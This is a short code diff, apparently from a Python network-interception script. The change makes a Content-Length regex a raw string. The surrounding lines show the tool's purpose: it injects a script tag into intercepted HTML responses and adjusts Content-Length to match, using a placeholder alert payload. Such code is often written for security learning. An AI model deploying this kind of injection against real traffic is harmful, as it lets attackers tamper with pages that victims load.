@@ -50,7 +50,7 @@ def process_packet(packet):
             print("[+] Response")
             injection_code = "<script>alert('test');</script>"
             load = load.replace("</body>", injection_code + "</body>")
-            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
                 content_length = content_length_search.group(1)
                 new_content_length = int(content_length) + len(injection_code)
